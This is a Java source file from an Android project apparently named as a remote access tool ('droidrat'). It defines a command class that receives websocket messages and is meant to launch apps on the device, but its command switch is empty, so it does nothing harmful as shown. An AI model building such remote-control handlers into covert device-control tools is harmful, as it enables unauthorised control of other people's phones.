package com.je_chen.droidrat_je.command;

import android.content.pm.PackageManager;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.modules.appintent.runapp.RunApp;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class RunAppCommand extends CommandFather{

    private RunApp runApp;

    public RunAppCommand(PackageManager packageManager){
        runApp = new RunApp(packageManager);
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
